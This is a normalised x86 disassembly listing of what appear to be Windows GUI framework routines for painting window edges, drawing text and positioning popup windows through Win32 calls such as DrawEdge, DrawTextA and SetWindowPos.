mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
sub eax [ ebx + 0x48 ]
sub eax [ ebp - 0x40 ]
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x4d ] 0x2
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
add [ eax ] edx
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
add al 0xfe
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
add eax [ ebp - 0x44 ]
sub eax [ ebx + 0x48 ]
mov [ ebp - 0x44 ] eax
jmp r-xdata
mov [ ebp - 0x4d ] 0x3
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
add [ eax ] edx
xor eax eax
jmp r-xdata
mov al 0x1
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
mov al 0x1
jmp r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
mov dl [ ebp - 0x4d ]
dec edx
sub dl 0x2
jb r-xdata
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
sub edx [ ebx + 0x4c ]
sub edx [ ebp - 0x48 ]
mov [ ebp - 0x48 ] edx
mov al 0x2
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax ] edx
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
add edx [ ebp - 0x4c ]
sub edx [ ebx + 0x4c ]
mov [ ebp - 0x4c ] edx
jmp r-xdata
mov al 0x3
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x40 ]
jge r-xdata
mov edx [ ebx + 0x48 ]
add [ ebp - 0x30 ] edx
add [ ebp - 0x34 ] edx
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x44 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x40 ]
mov [ edx ] ecx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x20 ]
jle r-xdata
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x44 ]
mov [ edx ] ecx
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x24 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ ebp - 0x20 ] edx
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x48 ]
jge r-xdata
mov eax [ ebx + 0x4c ]
add [ ebp - 0x38 ] eax
add [ ebp - 0x3c ] eax
jmp r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x4c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x48 ]
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x28 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4c ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x2c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x2c ] eax
jmp r-xdata
sub_446f1d
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_446b44
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_440d00
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_446f5c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_441b84
mov eax esi
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0x74 ]
mov eax edi
call sub_43f618
cmp [ edi + 0x158 ] 0x0
jne r-xdata
sub_446fa4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_441da4
mov eax esi
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx [ ebx + 0x158 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_446fd4
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
call sub_4467d4
test al al
je r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb4 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax [ ebp - 0x4 ]
call sub_442d30
xor ecx ecx
push ebp
push sub_447103
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
call sub_4431c8
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_4431c8
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44710a
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_442d38
retn
inc esi
mov [ ebp - 0x14 ] 0x0
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edi [ ebp - 0x28 ]
sub edi [ ebp - 0x38 ]
jmp r-xdata
add cl 0xfd
sub cl 0x2
jae r-xdata
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
sub dl 0x3
jae r-xdata
xor edi edi
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_44318c
cmp [ eax + 0x57 ] 0x0
jne r-xdata
xor edx edx
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x24 ]
sub edx [ ebp - 0x34 ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
sub ecx [ ebp - 0x18 ]
mov edx [ eax + 0x40 ]
sub edx edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_44710a
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
test al al
je r-xdata
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x28 ]
test eax eax
jle r-xdata
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x48 ]
mov ecx [ ebp - 0x30 ]
sub ecx [ ebp - 0x38 ]
sub eax ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] eax
cmp dl 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
sub al 0x3
jae r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x24 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_4034e4
jmp r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x4c ]
mov ecx [ ebp - 0x2c ]
sub ecx [ ebp - 0x34 ]
sub eax ecx
mov ecx [ ebp - 0xc ]
mov [ ecx ] eax
cmp dl 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_4034e4
jmp r-xdata
sub_4471a0
sub edx 0x1
jb r-xdata
cmp cl [ eax + 0x163 ]
je r-xdata
je r-xdata
retn
mov [ eax + 0x163 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_440e64
retn
cmp cl [ eax + 0x164 ]
je r-xdata
jmp r-xdata
mov [ eax + 0x164 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_440e64
sub_4471e4
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x162 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x162 ] al
push 0x0
xor ecx ecx
mov edx 0xb03b
mov eax ebx
call sub_440e64
sub_447234
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ esi + 0x8 ]
mov esi eax
mov eax [ ebx + 0x16c ]
neg eax
push eax
mov edx [ ebx + 0x16c ]
neg edx
push eax
mov edi esi
push edi
call InflateRect
cmp [ ebx + 0x165 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
xor eax eax
cmp [ ebx + 0x163 ] 0x0
je r-xdata
cmp [ ebx + 0x164 ] 0x0
je r-xdata
add eax [ ebx + 0x168 ]
mov esi edi
test [ ebx + 0x162 ] 0x1
je r-xdata
add eax [ ebx + 0x168 ]
test [ ebx + 0x162 ] 0x2
je r-xdata
add [ esi ] eax
test [ ebx + 0x162 ] 0x4
je r-xdata
add [ esi + 0x4 ] eax
test [ ebx + 0x162 ] 0x8
je r-xdata
sub [ esi + 0x8 ] eax
sub [ esi + 0xc ] eax
sub_4472c4
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4464d0
push eax
call GetWindowDC
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_44752a
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4464d0
push eax
call GetClientRect
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4464d0
push eax
call GetWindowRect
push 0x2
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4464d0
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call ExcludeClipRect
lea esi [ ebp - 0x2c ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
push eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call InflateRect
lea esi [ ebp - 0x1c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x16c ] 0x0
jbe r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call IntersectClipRect
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x2c ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_420c6c
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call FillRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4464d0
push eax
call ReleaseDC
retn
xor ebx ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x163 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
call sub_433194
call sub_433274
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x164 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x52 ] 0x2
je r-xdata
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_4464d0
push eax
call GetWindowLongA
mov esi eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
call sub_433194
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_4337a4
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x2
je r-xdata
sub [ ebp - 0x2c ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x4
je r-xdata
sub [ ebp - 0x28 ] ebx
test esi 0x200000
je r-xdata
add [ ebp - 0x24 ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x8
je r-xdata
push 0x14
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x24 ] eax
test esi 0x100000
je r-xdata
add [ ebp - 0x20 ] ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x162 ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x165 ]
or eax [ edx * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x163 ]
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x164 ]
or eax [ edx * 4 + rw-data ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call DrawEdge
push 0x15
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x20 ] eax
sub_44756c
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
lea edx [ esp + 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406cec
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax esi
call sub_43f7f4
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_443d84
mov edi eax
test edi edi
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx 0x7b
mov eax edi
call sub_440e64
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax esi
call sub_442028
sub_4475d8
push ebx
push esi
mov esi edx
call sub_456c04
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
sub si 0x9
je r-xdata
push 0x0
mov dx 0x1
mov ax 0x2
call sub_406c88
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_440e64
jmp r-xdata
sub si 0x9
je r-xdata
push 0x0
mov dx 0x2
mov ax 0x2
call sub_406c88
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_440e64
add esi 0xffffffed
sub si 0x4
jae r-xdata
sub_44763c
push esi
mov esi eax
cmp [ edx + 0xc ] 0x1
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ edx + 0x8 ] 0x1
je r-xdata
mov eax esi
call sub_44414c
jmp r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_447674
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_44766c
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4476b4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43edb0
mov dl 0x1
mov eax [ r-xdata ]
call sub_420d88
mov esi eax
mov [ ebx + 0x160 ] esi
mov eax esi
mov edx ebx
call sub_43e88c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_447710
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
cmp esi [ rw-data ]
jne r-xdata
mov eax [ esi + 0x160 ]
call sub_4032e8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43ee88
test bl bl
jle r-xdata
xor eax eax
call sub_43ce80
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_447750
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_4210c0
xor eax eax
push ebp
push sub_4477eb
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_4214ec
xor eax eax
push ebp
push sub_4477c8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x8c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4477cf
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
xor edx edx
call sub_4214ec
retn
sub_4477fc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4480f0
mov edx 0x80ffff
mov eax esi
call sub_43fe50
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x80 ]
mov eax [ esi + 0x208 ]
call sub_42138c
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_420d54
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_447868
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_443324
mov [ ebx + 0x4 ] 0x80800000
or [ ebx + 0x24 ] 0x800
cmp [ rw-data ] 0x0
je r-xdata
mov edx 0x1
mov eax 0x5
call sub_40c050
test al al
je r-xdata
mov [ ebx + 0x8 ] 0x80
cmp [ rw-data ] 0x0
je r-xdata
or [ ebx + 0x24 ] 0x20000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_4432bc
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] 0x80
sub_4478d4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4464d0
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44792a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447931
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4464d0
push eax
call ReleaseDC
retn
sub_447938
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor edx edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4479d1
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
add [ ebp - 0x10 ] 0x2
add [ ebp - 0xc ] 0x2
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x80 ]
mov edx [ eax + 0x18 ]
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0xc ]
call sub_42046c
mov eax ebx
call sub_441fd0
or eax 0x810
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_43fcb0
mov eax [ ebp - 0x14 ]
call sub_4044f8
push eax
mov eax [ ebx + 0x208 ]
call sub_42146c
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4479d8
lea eax [ ebp - 0x14 ]
call sub_404038
retn
sub_4479e0
push esi
mov eax [ edx + 0x4 ]
cmp eax 0x100
jb r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx 0xb000
je r-xdata
cmp eax 0x108
jbe r-xdata
mov al 0x1
pop esi
retn
cmp ecx 0xb001
je r-xdata
cmp [ edx + 0x4 ] 0xb016
je r-xdata
cmp [ edx + 0x4 ] 0xb017
je r-xdata
cmp [ edx + 0x4 ] 0x111
je r-xdata
mov esi [ edx + 0x4 ]
cmp esi 0x200
jbe r-xdata
cmp [ edx + 0x4 ] 0xa0
je r-xdata
cmp esi 0x20a
jbe r-xdata
xor eax eax
pop esi
retn
sub_447a4c
push ebp
mov ebp esp
push 0x0
push 0x0
push esi
mov esi eax
xor eax eax
push ebp
push sub_447ad7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x210 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447ade
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40405c
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_43fcb0
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x208 ]
call sub_4212cc
mov edx eax
add edx 0x6
mov eax esi
call sub_43f46c
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_43fcb0
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x208 ]
call sub_4212e8
mov edx eax
add edx 0x4
mov eax esi
call sub_43f490
sub_447ae4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
mov esi [ rw-data ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor eax eax
push ebp
push sub_447cbd
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43fce0
add [ ebp - 0xc ] 0x4
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_440f08
mov eax [ esi ]
call sub_45d43c
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
add edx [ ebp - 0x14 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_45d448
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
add edx [ ebp - 0x18 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_45d43c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
call sub_45d430
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov eax [ esi ]
call sub_45d448
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x48 ]
mov [ ebp - 0x18 ] eax
mov eax [ esi ]
call sub_45d424
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ esi ]
call sub_45d430
mov [ ebp - 0x18 ] eax
push 0x10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_4464d0
push eax
call SetWindowPos
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x214 ]
cmp eax 0xfa
jbe r-xdata
mov eax [ esi ]
call sub_45d424
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_443bcc
push 0x4
mov eax [ ebp - 0x4 ]
call sub_4464d0
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447cc4
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x214 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
mov eax ebx
call sub_4042f8
cmp eax 0x64
jge r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1016
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1018
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_44ad38
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x14 ]
jle r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x1
xor ebx ebx
jmp r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x40000
push eax
push 0x64
mov eax [ ebp - 0x4 ]
call sub_4464d0
push eax
call [ rw-data ]
sub_447ccc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_447cf4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push 0x0
push ebx
mov ecx edi
xor edx edx
xor eax eax
call sub_41613c
mov eax esi
call sub_441fd0
or eax 0xc10
push eax
push ebx
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_4044f8
push eax
mov eax [ esi + 0x208 ]
call sub_42146c
push eax
call DrawTextA
add [ ebx + 0x8 ] 0x6
add [ ebx + 0xc ] 0x2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_447d50
push ebx
push esi
add esp 0xffffffe4
mov esi edx
mov ebx eax
